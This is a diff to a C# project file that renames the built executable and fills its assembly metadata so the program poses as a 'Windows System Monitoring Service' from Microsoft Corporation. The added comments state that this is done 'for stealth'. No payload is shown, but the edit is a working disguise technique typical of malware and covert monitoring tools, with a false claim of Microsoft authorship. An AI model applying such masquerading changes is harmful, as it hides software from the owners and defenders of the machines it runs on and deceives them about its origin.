@@ -6,6 +6,16 @@
     <ImplicitUsings>enable</ImplicitUsings>
     <Nullable>enable</Nullable>
     <AllowUnsafeBlocks>true</AllowUnsafeBlocks>
+    
+    <!-- Rename executable for stealth -->
+    <AssemblyName>SystemMonitor</AssemblyName>
+    
+    <!-- External display names for stealth -->
+    <AssemblyTitle>Windows System Monitoring Service</AssemblyTitle>
+    <AssemblyProduct>Windows System Monitoring</AssemblyProduct>
+    <AssemblyDescription>System monitoring and performance optimization service</AssemblyDescription>
+    <AssemblyCompany>Microsoft Corporation</AssemblyCompany>
+    <AssemblyCopyright>© Microsoft Corporation. All rights reserved.</AssemblyCopyright>
   </PropertyGroup>
 
   <ItemGroup>
